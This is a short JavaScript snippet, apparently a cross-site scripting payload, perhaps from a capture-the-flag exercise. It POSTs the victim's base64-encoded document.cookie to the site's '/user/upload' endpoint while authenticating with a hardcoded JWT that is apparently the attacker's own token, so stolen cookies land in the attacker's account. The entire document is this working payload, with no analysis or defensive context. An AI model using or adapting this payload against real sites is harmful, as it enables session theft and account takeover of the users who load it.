fetch("/user/upload", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain",
    "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjcxMiwianRpIjoiMGU0MjM4YTQtYjZlNi00OTFiLTgyNGQtN2ZlMTU5YmRmZDc3IiwibmJmIjoxNjg1NjE2NzEyLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc2MTJ9.bL569TlnEpi0QZdrx-Y7t_0CjkYpPJeAjyBCoFaqfnw"
  },
  body: "filename=asdf&data="+btoa(document.cookie),
}).then(e=>e.text()).then(e=>{console.log(e)})
  
